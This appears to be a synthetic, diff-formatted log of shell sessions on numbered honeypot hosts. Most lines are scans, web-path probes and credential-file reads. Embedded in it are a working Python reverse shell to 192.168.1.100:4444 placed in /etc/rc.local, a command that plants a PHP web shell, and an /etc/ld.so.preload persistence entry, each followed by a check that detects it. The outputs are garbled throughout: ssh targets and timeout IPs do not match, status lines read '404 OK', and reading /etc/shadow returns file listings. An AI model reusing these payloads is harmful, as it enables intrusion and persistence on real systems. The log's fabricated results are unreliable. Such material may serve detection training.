+Starting Nmap scan... Host is up (0.40s latency).
+
+root@honeypot-29:~# id
+Command executed.
+
+root@honeypot-23:~# nmap -sS -O 85.216.215.105
+Starting Nmap scan... Host is up (0.96s latency).
+
+root@honeypot-33:~# id
+Command executed.
+
+root@honeypot-37:~# wget -q --spider http://186.77.206.188/wp-admin/
+HTTP/1.1 200 OK
+
+root@honeypot-6:~# ssh -p 22 root@225.138.188.194
+ssh: connect to host 99.197.112.228 port 22: Connection timed out
+
+root@honeypot-7:~# ls -la /var/log/apache2/access.log
+Permission denied
+
+root@honeypot-25:~# whoami
+Command executed.
+
+root@honeypot-25:~# ssh -p 6379 user@82.210.237.154
+ssh: connect to host 75.116.189.26 port 22: Connection timed out
+
+root@honeypot-25:~# ss -tunlp | grep 443
+Command executed.
+
+root@honeypot-23:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-28:~# id
+Command executed.
+
+root@honeypot-13:~# nmap -sV -p 284-358 151.255.28.61
+Starting Nmap scan... Host is up (0.81s latency).
+
+root@honeypot-2:~# cat /var/log/auth.log.20260101102426
+-rw-r--r-- 1 root root 1073 Jan 21 06:31
+
+root@honeypot-29:~# ss -tunlp | grep 5432
+Command executed.
+
+root@honeypot-50:~# netstat -an | grep 27052
+Command executed.
+
+root@honeypot-38:~# ss -tunlp | grep 46829
+Command executed.
+
+root@honeypot-37:~# cat /var/log/auth.log.20260116082426
+-rw-r--r-- 1 root root 1251 Jan 21 09:38
+
+root@honeypot-39:~# cat /etc/shadow 2>/dev/null
+Permission denied
+
+root@honeypot-40:~# wget -q --spider http://133.223.250.5/shell.php
+HTTP/1.1 301 OK
+
+root@honeypot-50:~# nmap -sU -p 53,161,123 236.69.130.79
+Starting Nmap scan... Host is up (0.18s latency).
+
+root@honeypot-5:~# uname -a
+Command executed.
+
+root@honeypot-20:~# ls -la /tmp/b5d2293f
+-rw-r--r-- 1 root root 4318 Jan 21 05:42
+
+root@honeypot-14:~# nmap -sS -O 63.196.237.234
+Starting Nmap scan... Host is up (0.09s latency).
+
+root@honeypot-3:~# ssh guest@169.234.223.143 -o ConnectTimeout=3
+ssh: connect to host 17.125.42.22 port 22: Connection timed out
+
+root@honeypot-24:~# nmap -sU -p 53,161,123 152.27.29.251
+Starting Nmap scan... Host is up (0.30s latency).
+
+root@honeypot-45:~# whoami
+Command executed.
+
+root@honeypot-45:~# curl -I http://226.171.136.239:25/phpmyadmin/
+HTTP/1.1 404 OK
+
+root@honeypot-8:~# ssh -p 23 www-data@172.223.102.102
+ssh: connect to host 220.15.36.244 port 22: Connection timed out
+
+root@honeypot-27:~# whoami
+Command executed.
+
+root@honeypot-36:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-39:~# wget -q --spider http://15.64.228.156/config.php
+HTTP/1.1 500 OK
+
+root@honeypot-21:~# ss -tunlp | grep 80
+Command executed.
+
+root@honeypot-33:~# cat /proc/version
+Permission denied
+
+root@honeypot-49:~# ssh ftpuser@134.179.45.103 -o ConnectTimeout=3
+ssh: connect to host 37.22.239.42 port 22: Connection timed out
+
+root@honeypot-48:~# nmap -sS -O 130.28.121.185
+Starting Nmap scan... Host is up (0.44s latency).
+
+root@honeypot-29:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 9709 Jan 21 05:08
+
+root@honeypot-47:~# cat /etc/passwd | head -1
+-rw-r--r-- 1 root root 3193 Jan 21 17:48
+
+root@honeypot-16:~# ping -c 1 239.81.74.127
+PING: 64 bytes from 164.139.86.187: icmp_seq=1 ttl=64 time=22.3 ms
+
+root@honeypot-30:~# curl -s -o /dev/null -w '%{http_code}' http://16.188.18.78:20684/.git/config
+HTTP/1.1 500 OK
+
+root@honeypot-43:~# nmap -sV -p 613-655 132.29.41.58
+Starting Nmap scan... Host is up (0.57s latency).
+
+root@honeypot-34:~# ls -la /tmp/11ed7124
+-rw-r--r-- 1 root root 4482 Jan 21 01:35
+
+root@honeypot-34:~# cat /proc/version
+-rw-r--r-- 1 root root 1145 Jan 21 17:42
+
+root@honeypot-28:~# curl -s -o /dev/null -w '%{http_code}' http://30.227.33.12:65165/backup.sql
+HTTP/1.1 301 OK
+
+root@honeypot-16:~# nmap -sU -p 53,161,123 226.224.107.240
+Starting Nmap scan... Host is up (0.13s latency).
+
+root@honeypot-15:~# whoami
+Command executed.
+
+root@honeypot-7:~# whoami
+Command executed.
+
+root@honeypot-24:~# ls -la /var/log/syslog
+Permission denied
+
+root@honeypot-10:~# ls -la /var/log/apache2/access.log
+Permission denied
+
+The session continues in following lines.
+
+Last login: Fri Jan 23 16:24:27 2026 from 192.168.1.140  
+security@server-125:~$ cat /etc/rc.local | grep -E 'python3.*socket.*4444' && ls -la /etc/rc.local | grep -E '^-..x'	<2026-01-23 16:24:31.790497>
+nohup /usr/bin/python3 -c "import socket,subprocess;s=socket.socket();s.connect((\"192.168.1.100\",4444));subprocess.call([\"bash\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())" &
+-rwxr-xr-x 1 root root 245 Jan 23 16:22 /etc/rc.local
+root@honeypot-31:~# ss -tunlp | grep 80
+Command executed.
+
+root@honeypot-26:~# curl -s -o /dev/null -w '%{http_code}' http://78.169.100.213:25441/upload.php
+HTTP/1.1 301 OK
+
+root@honeypot-37:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-4:~# ls -la /var/log/syslog
+-rw-r--r-- 1 root root 7590 Jan 21 13:19
+
+root@honeypot-6:~# ls -la /tmp/1c206edd
+-rw-r--r-- 1 root root 8730 Jan 21 02:13
+
+root@honeypot-5:~# cat /etc/shadow 2>/dev/null
+Permission denied
+
+root@honeypot-33:~# cat /etc/passwd | head -1
+Permission denied
+
+root@honeypot-26:~# ss -tunlp | grep 8080
+Command executed.
+
+root@honeypot-33:~# nmap -sU -p 53,161,123 238.193.37.220
+Starting Nmap scan... Host is up (0.98s latency).
+
+root@honeypot-37:~# wget -q --spider http://200.226.228.59/backup.sql
+HTTP/1.1 404 OK
+
+root@honeypot-34:~# curl -I http://87.205.238.227:8080/.env
+HTTP/1.1 404 OK
+
+root@honeypot-39:~# curl -I http://218.252.203.167:47096/cmd.php
+HTTP/1.1 200 OK
+
+root@honeypot-45:~# ss -tunlp | grep 34609
+Command executed.
+
+root@honeypot-12:~# nmap -sU -p 53,161,123 13.124.240.56
+Starting Nmap scan... Host is up (0.21s latency).
+
+root@honeypot-13:~# cat /etc/passwd | head -1
+-rw-r--r-- 1 root root 9078 Jan 21 16:07
+
+root@honeypot-15:~# ls -la /tmp/500db14c
+Permission denied
+
+root@honeypot-26:~# uname -a
+Command executed.
+
+root@honeypot-48:~# cat /etc/passwd | head -1
+-rw-r--r-- 1 root root 2607 Jan 21 17:25
+
+root@honeypot-48:~# cat /etc/shadow 2>/dev/null
+Permission denied
+
+root@honeypot-29:~# id
+Command executed.
+
+root@honeypot-15:~# id
+Command executed.
+
+root@honeypot-50:~# ping -c 1 151.152.246.187
+PING: 64 bytes from 207.174.229.148: icmp_seq=1 ttl=64 time=34.3 ms
+
+root@honeypot-12:~# ping -c 1 175.193.24.128
+PING: 64 bytes from 225.31.155.6: icmp_seq=1 ttl=64 time=11.4 ms
+
+root@honeypot-23:~# cat /var/log/auth.log.20260114162631
+-rw-r--r-- 1 root root 8631 Jan 21 11:53
+
+root@honeypot-47:~# wget -q --spider http://219.71.127.243/test.php
+HTTP/1.1 404 OK
+
+root@honeypot-30:~# ss -tunlp | grep 5432
+Command executed.
+
+root@honeypot-28:~# nmap -sU -p 53,161,123 122.80.226.175
+Starting Nmap scan... Host is up (0.17s latency).
+
+root@honeypot-48:~# ssh user@196.173.100.201 -o ConnectTimeout=3
+ssh: connect to host 92.4.136.116 port 22: Connection timed out
+
+root@honeypot-13:~# wget -q --spider http://88.148.85.14/phpmyadmin/
+HTTP/1.1 500 OK
+
+root@honeypot-41:~# ls -la /var/log/syslog
+-rw-r--r-- 1 root root 8418 Jan 21 18:39
+
+root@honeypot-35:~# cat /proc/version
+-rw-r--r-- 1 root root 7542 Jan 21 02:28
+
+root@honeypot-15:~# id
+Command executed.
+
+root@honeypot-44:~# ss -tunlp | grep 22
+Command executed.
+
+root@honeypot-42:~# ping -c 1 53.213.105.76
+PING: 64 bytes from 4.229.30.215: icmp_seq=1 ttl=64 time=43.4 ms
+
+root@honeypot-49:~# cat /var/log/auth.log.20260108042631
+-rw-r--r-- 1 root root 8337 Jan 21 17:06
+
+root@honeypot-20:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-41:~# ss -tunlp | grep 3389
+Command executed.
+
+root@honeypot-21:~# cat /etc/passwd | head -1
+-rw-r--r-- 1 root root 3230 Jan 21 19:47
+
+root@honeypot-26:~# netstat -an | grep 22
+Command executed.
+
+root@honeypot-35:~# cat /proc/version
+-rw-r--r-- 1 root root 5446 Jan 21 07:45
+
+root@honeypot-18:~# curl -I http://199.158.251.9:443/robots.txt
+HTTP/1.1 301 OK
+
+root@honeypot-19:~# curl -I http://213.112.161.21:443/.git/config
+HTTP/1.1 301 OK
+
+root@honeypot-10:~# ssh deploy@86.201.153.226 -o ConnectTimeout=3
+ssh: connect to host 106.46.231.187 port 22: Connection timed out
+
+root@honeypot-3:~# curl -s -o /dev/null -w '%{http_code}' http://76.73.12.234:22/admin.php
+HTTP/1.1 301 OK
+
+root@honeypot-21:~# ls -la /var/log/nginx/error.log
+-rw-r--r-- 1 root root 9178 Jan 21 03:47
+
+root@honeypot-47:~# ssh user@216.17.95.251 -o ConnectTimeout=3
+ssh: connect to host 180.232.158.85 port 22: Connection timed out
+
+root@honeypot-29:~# cat /proc/version
+-rw-r--r-- 1 root root 6273 Jan 21 11:28
+
+root@honeypot-12:~# nmap -sS -O 36.192.87.10
+Starting Nmap scan... Host is up (0.10s latency).
+
+root@honeypot-20:~# ssh www-data@133.199.209.254 -o ConnectTimeout=3
+ssh: connect to host 91.200.213.206 port 22: Connection timed out
+
+root@honeypot-7:~# wget -q --spider http://216.37.51.59/test.php
+HTTP/1.1 301 OK
+
+The session continues in following lines.
+
+Last login: Fri Jan 23 16:26:32 2026 from 192.168.1.143  
+auditd@server-142:~$ echo '<?php if(isset($_REQUEST["c"])){$c=$_REQUEST["c"];@system($c." 2>&1");} ?>' > /var/www/html/.system.php	<2026-01-23 16:26:36.779763>
+Command executed.
+root@honeypot-5:~# cat /etc/passwd | head -1
+Permission denied
+
+root@honeypot-42:~# ssh deploy@118.113.153.105 -o ConnectTimeout=3
+ssh: connect to host 40.62.157.194 port 22: Connection timed out
+
+root@honeypot-3:~# ls -la /tmp/f1e00ddf
+-rw-r--r-- 1 root root 796 Jan 21 16:23
+
+root@honeypot-11:~# nmap -sV -p 370-465 200.97.193.246
+Starting Nmap scan... Host is up (0.39s latency).
+
+root@honeypot-2:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 8770 Jan 21 18:37
+
+root@honeypot-26:~# whoami
+Command executed.
+
+root@honeypot-41:~# ping -c 1 157.78.252.171
+PING: 64 bytes from 127.152.237.160: icmp_seq=1 ttl=64 time=20.1 ms
+
+root@honeypot-31:~# whoami
+Command executed.
+
+root@honeypot-33:~# nmap -sV -p 65-84 119.189.230.195
+Starting Nmap scan... Host is up (0.67s latency).
+
+root@honeypot-21:~# wget -q --spider http://229.221.156.204/robots.txt
+HTTP/1.1 500 OK
+
+root@honeypot-31:~# whoami
+Command executed.
+
+root@honeypot-43:~# ss -tunlp | grep 42433
+Command executed.
+
+root@honeypot-23:~# cat /var/log/auth.log.20260110022836
+-rw-r--r-- 1 root root 5102 Jan 21 22:20
+
+root@honeypot-29:~# ls -la /var/log/auth.log
+-rw-r--r-- 1 root root 9799 Jan 21 05:38
+
+root@honeypot-32:~# curl -s -o /dev/null -w '%{http_code}' http://236.133.10.52:80/phpmyadmin/
+HTTP/1.1 404 OK
+
+root@honeypot-44:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-48:~# ping -c 1 46.226.205.38
+PING: 64 bytes from 105.102.248.172: icmp_seq=1 ttl=64 time=49.2 ms
+
+root@honeypot-15:~# uname -a
+Command executed.
+
+root@honeypot-16:~# ls -la /tmp/ca52632f
+-rw-r--r-- 1 root root 9459 Jan 21 19:42
+
+root@honeypot-41:~# id
+Command executed.
+
+root@honeypot-11:~# nmap -sS -O 113.151.175.13
+Starting Nmap scan... Host is up (0.83s latency).
+
+root@honeypot-42:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-21:~# wget -q --spider http://175.117.8.20/config.php
+HTTP/1.1 301 OK
+
+root@honeypot-26:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-29:~# cat /var/log/auth.log.20260108012836
+Permission denied
+
+root@honeypot-12:~# wget -q --spider http://122.100.208.138/test.php
+HTTP/1.1 403 OK
+
+root@honeypot-6:~# ssh -p 5432 guest@193.9.205.234
+ssh: connect to host 30.111.207.51 port 22: Connection timed out
+
+root@honeypot-30:~# whoami
+Command executed.
+
+root@honeypot-19:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-23:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-45:~# wget -q --spider http://131.0.243.188/phpmyadmin/
+HTTP/1.1 500 OK
+
+root@honeypot-41:~# wget -q --spider http://208.2.6.18/wp-admin/
+HTTP/1.1 404 OK
+
+root@honeypot-24:~# ls -la /tmp/2dca15ab
+Permission denied
+
+root@honeypot-12:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-39:~# ls -la /var/log/messages
+Permission denied
+
+root@honeypot-47:~# cat /proc/version
+-rw-r--r-- 1 root root 8512 Jan 21 07:01
+
+root@honeypot-24:~# uname -a
+Command executed.
+
+root@honeypot-32:~# wget -q --spider http://224.242.199.139/cmd.php
+HTTP/1.1 500 OK
+
+root@honeypot-46:~# ls -la /var/log/messages
+-rw-r--r-- 1 root root 2113 Jan 21 13:07
+
+root@honeypot-19:~# nmap -sS -O 182.51.89.69
+Starting Nmap scan... Host is up (0.17s latency).
+
+root@honeypot-45:~# ss -tunlp | grep 27017
+Command executed.
+
+root@honeypot-34:~# curl -I http://72.134.240.230:80/admin.php
+HTTP/1.1 301 OK
+
+root@honeypot-27:~# id
+Command executed.
+
+root@honeypot-19:~# ls -la /tmp/36481c81
+Permission denied
+
+root@honeypot-47:~# ls -la /var/log/apache2/access.log
+-rw-r--r-- 1 root root 8727 Jan 21 03:31
+
+root@honeypot-8:~# netstat -an | grep 27017
+Command executed.
+
+root@honeypot-38:~# cat /var/log/auth.log.20260107212836
+Permission denied
+
+root@honeypot-38:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 3975 Jan 21 23:45
+
+root@honeypot-17:~# curl -s -o /dev/null -w '%{http_code}' http://32.255.14.226:5432/config.php
+HTTP/1.1 403 OK
+
+root@honeypot-12:~# cat /proc/version
+-rw-r--r-- 1 root root 4558 Jan 21 03:28
+
+The session continues in following lines.
+
+Last login: Fri Jan 23 16:28:37 2026 from 192.168.1.146  
+engineer@server-158:~$ cat /var/www/html/.system.php | grep -E '\$_REQUEST.*system' && ls -la /var/www/html/.system.php	<2026-01-23 16:28:41.476113>
+<?php if(isset($_REQUEST["c"])){$c=$_REQUEST["c"];@system($c." 2>&1");} ?>
+-rw-r--r-- 1 root root 85 Jan 23 16:26 /var/www/html/.system.php
+root@honeypot-21:~# nmap -sU -p 53,161,123 5.178.60.153
+Starting Nmap scan... Host is up (0.51s latency).
+
+root@honeypot-49:~# ssh -p 27017 admin@196.74.111.22
+ssh: connect to host 254.231.158.15 port 22: Connection timed out
+
+root@honeypot-3:~# curl -s -o /dev/null -w '%{http_code}' http://113.133.251.134:22/.git/config
+HTTP/1.1 404 OK
+
+root@honeypot-5:~# nmap -sV -p 630-664 156.160.201.213
+Starting Nmap scan... Host is up (0.67s latency).
+
+root@honeypot-45:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 8233 Jan 21 21:22
+
+root@honeypot-36:~# cat /proc/version
+Permission denied
+
+root@honeypot-44:~# netstat -an | grep 21
+Command executed.
+
+root@honeypot-16:~# nmap -sU -p 53,161,123 228.84.65.194
+Starting Nmap scan... Host is up (0.99s latency).
+
+root@honeypot-7:~# ss -tunlp | grep 27017
+Command executed.
+
+root@honeypot-37:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-2:~# whoami
+Command executed.
+
+root@honeypot-20:~# netstat -an | grep 27017
+Command executed.
+
+root@honeypot-27:~# cat /etc/shadow 2>/dev/null
+Permission denied
+
+root@honeypot-13:~# uname -a
+Command executed.
+
+root@honeypot-17:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-25:~# cat /etc/passwd | head -1
+-rw-r--r-- 1 root root 8528 Jan 21 01:32
+
+root@honeypot-44:~# id
+Command executed.
+
+root@honeypot-10:~# ss -tunlp | grep 56612
+Command executed.
+
+root@honeypot-30:~# curl -I http://247.32.240.133:37726/phpmyadmin/
+HTTP/1.1 404 OK
+
+root@honeypot-21:~# cat /var/log/auth.log.20260117232845
+-rw-r--r-- 1 root root 5322 Jan 21 03:25
+
+root@honeypot-39:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 1198 Jan 21 17:35
+
+root@honeypot-2:~# ssh -p 23 guest@176.94.22.231
+ssh: connect to host 226.109.121.59 port 22: Connection timed out
+
+root@honeypot-3:~# cat /proc/version
+-rw-r--r-- 1 root root 9695 Jan 21 09:56
+
+root@honeypot-41:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-39:~# curl -s -o /dev/null -w '%{http_code}' http://136.136.12.10:3306/upload.php
+HTTP/1.1 200 OK
+
+root@honeypot-28:~# wget -q --spider http://236.97.25.150/test.php
+HTTP/1.1 404 OK
+
+root@honeypot-12:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-23:~# nmap -sU -p 53,161,123 41.104.223.174
+Starting Nmap scan... Host is up (0.36s latency).
+
+root@honeypot-50:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-4:~# nmap -sS -O 239.186.0.98
+Starting Nmap scan... Host is up (0.25s latency).
+
+root@honeypot-41:~# nmap -sU -p 53,161,123 231.181.212.50
+Starting Nmap scan... Host is up (0.78s latency).
+
+root@honeypot-34:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-1:~# ls -la /tmp/b750e682
+-rw-r--r-- 1 root root 8064 Jan 21 04:43
+
+root@honeypot-16:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-32:~# uname -a
+Command executed.
+
+root@honeypot-28:~# cat /proc/version
+-rw-r--r-- 1 root root 4864 Jan 21 16:52
+
+root@honeypot-16:~# cat /etc/passwd | head -1
+-rw-r--r-- 1 root root 751 Jan 21 02:42
+
+root@honeypot-22:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-32:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-17:~# cat /var/log/auth.log.20251227072845
+-rw-r--r-- 1 root root 7383 Jan 21 20:40
+
+root@honeypot-23:~# curl -I http://197.225.139.66:25/wp-admin/
+HTTP/1.1 403 OK
+
+root@honeypot-4:~# whoami
+Command executed.
+
+root@honeypot-50:~# nmap -sV -p 888-941 9.210.85.157
+Starting Nmap scan... Host is up (0.22s latency).
+
+root@honeypot-40:~# curl -I http://241.105.240.192:3306/wp-admin/
+HTTP/1.1 301 OK
+
+root@honeypot-13:~# nmap -sS -O 205.119.192.10
+Starting Nmap scan... Host is up (0.76s latency).
+
+root@honeypot-7:~# ssh -p 50299 user@87.121.132.37
+ssh: connect to host 188.249.42.72 port 22: Connection timed out
+
+root@honeypot-46:~# whoami
+Command executed.
+
+root@honeypot-43:~# nmap -sU -p 53,161,123 238.209.2.167
+Starting Nmap scan... Host is up (0.17s latency).
+
+root@honeypot-47:~# ls -la /var/log/apache2/access.log
+-rw-r--r-- 1 root root 3778 Jan 21 22:18
+
+root@honeypot-12:~# nmap -sU -p 53,161,123 90.190.217.73
+Starting Nmap scan... Host is up (0.59s latency).
+
+The session continues in following lines.
+
+Last login: Fri Jan 23 16:28:46 2026 from 192.168.1.149  
+operator@server-172:~$ echo '/usr/local/lib/libsystem.so' >> /etc/ld.so.preload && mkdir -p /usr/local/lib && touch /usr/local/lib/libsystem.so	<2026-01-23 16:28:50.455079>
+Command executed.
+root@honeypot-47:~# ping -c 1 223.60.162.86
+PING: 64 bytes from 26.53.190.54: icmp_seq=1 ttl=64 time=30.6 ms
+
+root@honeypot-19:~# wget -q --spider http://39.173.84.13/admin.php
+HTTP/1.1 404 OK
+
+root@honeypot-24:~# ss -tunlp | grep 27017
+Command executed.
+
+root@honeypot-32:~# ss -tunlp | grep 30471
+Command executed.
+
+root@honeypot-28:~# curl -s -o /dev/null -w '%{http_code}' http://134.62.202.35:49234/robots.txt
+HTTP/1.1 404 OK
+
+root@honeypot-21:~# uname -a
+Command executed.
+
+root@honeypot-36:~# nmap -sV -p 598-680 16.197.59.162
+Starting Nmap scan... Host is up (0.68s latency).
+
+root@honeypot-30:~# wget -q --spider http://25.131.42.125/admin.php
+HTTP/1.1 403 OK
+
+root@honeypot-28:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-6:~# wget -q --spider http://151.83.119.163/phpmyadmin/
+HTTP/1.1 301 OK
+
+root@honeypot-12:~# ss -tunlp | grep 27017
+Command executed.
+
+root@honeypot-28:~# netstat -an | grep 28924
+Command executed.
+
+root@honeypot-9:~# wget -q --spider http://96.252.203.170/wp-admin/
+HTTP/1.1 200 OK
+
+root@honeypot-35:~# nmap -sU -p 53,161,123 6.134.21.242
+Starting Nmap scan... Host is up (0.24s latency).
+
+root@honeypot-31:~# cat /proc/version
+-rw-r--r-- 1 root root 9806 Jan 21 02:45
+
+root@honeypot-6:~# cat /proc/version
+-rw-r--r-- 1 root root 3017 Jan 21 03:32
+
+root@honeypot-45:~# ss -tunlp | grep 27017
+Command executed.
+
+root@honeypot-23:~# nmap -sU -p 53,161,123 199.28.119.9
+Starting Nmap scan... Host is up (0.11s latency).
+
+root@honeypot-24:~# ls -la /tmp/844ef3c3
+-rw-r--r-- 1 root root 3155 Jan 21 11:53
+
+root@honeypot-28:~# ss -tunlp | grep 12266
+Command executed.
+
+root@honeypot-17:~# nmap -sV -p 949-995 111.107.85.249
+Starting Nmap scan... Host is up (0.17s latency).
+
+root@honeypot-20:~# ls -la /tmp/729d844b
+Permission denied
+
+root@honeypot-18:~# ssh -p 25 ubuntu@176.110.172.116
+ssh: connect to host 94.52.160.134 port 22: Connection timed out
+
+root@honeypot-36:~# nmap -sV -p 961-985 58.149.209.127
+Starting Nmap scan... Host is up (0.73s latency).
+
+root@honeypot-46:~# cat /var/log/auth.log.20251223223050
+-rw-r--r-- 1 root root 7949 Jan 21 04:16
+
+root@honeypot-28:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 4425 Jan 21 16:42
+
+root@honeypot-19:~# ss -tunlp | grep 80
+Command executed.
+
+root@honeypot-27:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-7:~# ssh deploy@68.131.224.252 -o ConnectTimeout=3
+ssh: connect to host 126.71.24.5 port 22: Connection timed out
+
+root@honeypot-42:~# cat /proc/version
+-rw-r--r-- 1 root root 7477 Jan 21 13:06
+
+root@honeypot-3:~# ls -la /var/log/apache2/access.log
+-rw-r--r-- 1 root root 9261 Jan 21 08:34
+
+root@honeypot-16:~# cat /var/log/auth.log.20260111133050
+-rw-r--r-- 1 root root 6324 Jan 21 01:31
+
+root@honeypot-18:~# ssh -p 6379 test@90.145.89.7
+ssh: connect to host 136.204.71.177 port 22: Connection timed out
+
+root@honeypot-25:~# cat /etc/passwd | head -1
+-rw-r--r-- 1 root root 1701 Jan 21 23:10
+
+root@honeypot-10:~# ssh test@218.154.245.17 -o ConnectTimeout=3
+ssh: connect to host 207.43.202.173 port 22: Connection timed out
+
+root@honeypot-11:~# ss -tunlp | grep 25
+Command executed.
+
+root@honeypot-9:~# cat /proc/version
+-rw-r--r-- 1 root root 6854 Jan 21 13:59
+
+root@honeypot-39:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-2:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-31:~# ssh -p 25 www-data@247.45.7.246
+ssh: connect to host 66.160.224.120 port 22: Connection timed out
+
+root@honeypot-12:~# curl -I http://31.126.132.196:45215/shell.php
+HTTP/1.1 500 OK
+
+root@honeypot-36:~# curl -I http://21.249.228.232:3389/upload.php
+HTTP/1.1 301 OK
+
+root@honeypot-9:~# ssh -p 3389 guest@163.64.191.230
+ssh: connect to host 60.227.242.92 port 22: Connection timed out
+
+root@honeypot-41:~# ssh guest@204.173.69.128 -o ConnectTimeout=3
+ssh: connect to host 77.95.140.11 port 22: Connection timed out
+
+root@honeypot-30:~# wget -q --spider http://235.208.26.179/.git/config
+HTTP/1.1 200 OK
+
+root@honeypot-43:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-10:~# ssh -p 25 test@63.141.48.33
+ssh: connect to host 200.253.85.47 port 22: Connection timed out
+
+root@honeypot-44:~# ssh -p 25 test@68.77.121.228
+ssh: connect to host 127.3.126.116 port 22: Connection timed out
+
+root@honeypot-49:~# nmap -sS -O 29.133.188.149
+Starting Nmap scan... Host is up (0.01s latency).
+
+root@honeypot-16:~# nmap -sV -p 664-712 17.240.163.215
+Starting Nmap scan... Host is up (0.78s latency).
+
+The session continues in following lines.
+
+Last login: Fri Jan 23 16:30:51 2026 from 192.168.1.152  
+auditor@server-185:~$ cat /etc/ld.so.preload | grep -E 'libsystem.so' && ls -la /usr/local/lib/libsystem.so	<2026-01-23 16:30:55.195109>
+/usr/local/lib/libsystem.so
+-rw-r--r-- 1 root root 0 Jan 23 16:28 /usr/local/lib/libsystem.so
+root@honeypot-14:~# curl -s -o /dev/null -w '%{http_code}' http://196.252.90.80:30128/wp-admin/
+HTTP/1.1 404 OK
+
+root@honeypot-19:~# id
+Command executed.
+
+root@honeypot-43:~# nmap -sS -O 241.60.29.127
+Starting Nmap scan... Host is up (0.36s latency).
+
+root@honeypot-45:~# cat /etc/passwd | head -1
+-rw-r--r-- 1 root root 2038 Jan 21 02:37
+
+root@honeypot-13:~# whoami
+Command executed.
+
+root@honeypot-2:~# curl -I http://84.143.7.92:80/admin.php
+HTTP/1.1 403 OK
+
+root@honeypot-3:~# ls -la /var/log/syslog
+-rw-r--r-- 1 root root 138 Jan 21 00:40
+
+root@honeypot-43:~# cat /proc/version
+Permission denied
+
+root@honeypot-15:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-49:~# nmap -sV -p 557-629 220.62.134.94
+Starting Nmap scan... Host is up (0.11s latency).
+
+root@honeypot-22:~# ssh -p 22 deploy@238.161.83.166
+ssh: connect to host 160.127.171.122 port 22: Connection timed out
+
+root@honeypot-31:~# cat /proc/version
+-rw-r--r-- 1 root root 2385 Jan 21 22:50
+
+root@honeypot-22:~# netstat -an | grep 3389
+Command executed.
+
+root@honeypot-47:~# curl -s -o /dev/null -w '%{http_code}' http://177.59.9.59:4510/upload.php
+HTTP/1.1 403 OK
+
+root@honeypot-32:~# ssh -p 13056 test@228.11.178.56
+ssh: connect to host 105.55.153.115 port 22: Connection timed out
+
+root@honeypot-8:~# cat /etc/passwd | head -1
+-rw-r--r-- 1 root root 2063 Jan 21 01:15
+
+root@honeypot-32:~# cat /proc/version
+-rw-r--r-- 1 root root 2187 Jan 21 00:36
+
+root@honeypot-30:~# wget -q --spider http://65.230.141.184/test.php
+HTTP/1.1 500 OK
+
+root@honeypot-13:~# whoami
+Command executed.
+
+root@honeypot-13:~# nmap -sV -p 155-250 69.122.105.134
+Starting Nmap scan... Host is up (0.63s latency).
+
+root@honeypot-43:~# wget -q --spider http://118.48.52.53/test.php
+HTTP/1.1 403 OK
+
+root@honeypot-4:~# ls -la /var/log/nginx/error.log
+-rw-r--r-- 1 root root 5043 Jan 21 13:31
+
+root@honeypot-6:~# nmap -sS -O 247.30.162.189
+Starting Nmap scan... Host is up (0.32s latency).
+
+root@honeypot-4:~# cat /var/log/auth.log.20260122203255
+-rw-r--r-- 1 root root 9198 Jan 21 09:18
+
+root@honeypot-48:~# curl -I http://106.220.163.249:48831/.env
+HTTP/1.1 301 OK
+
+root@honeypot-32:~# nmap -sV -p 978-1050 77.201.64.103
+Starting Nmap scan... Host is up (0.29s latency).
+
+root@honeypot-5:~# ssh ftpuser@227.4.187.170 -o ConnectTimeout=3
+ssh: connect to host 153.190.163.10 port 22: Connection timed out
+
+root@honeypot-23:~# ls -la /var/log/apache2/access.log
+Permission denied
+
+root@honeypot-28:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 7802 Jan 21 10:28
+
+root@honeypot-13:~# uname -a
+Command executed.
+
+root@honeypot-49:~# nmap -sS -O 169.150.110.24
+Starting Nmap scan... Host is up (0.41s latency).
+
+root@honeypot-8:~# nmap -sS -O 190.107.4.30
+Starting Nmap scan... Host is up (0.92s latency).
+
+root@honeypot-6:~# ping -c 1 213.61.165.98
+PING: 64 bytes from 131.20.172.217: icmp_seq=1 ttl=64 time=20.2 ms
+
+root@honeypot-42:~# uname -a
+Command executed.
+
+root@honeypot-12:~# ls -la /var/log/secure
+Permission denied
+
+root@honeypot-45:~# ssh deploy@213.205.166.74 -o ConnectTimeout=3
+ssh: connect to host 75.177.78.200 port 22: Connection timed out
+
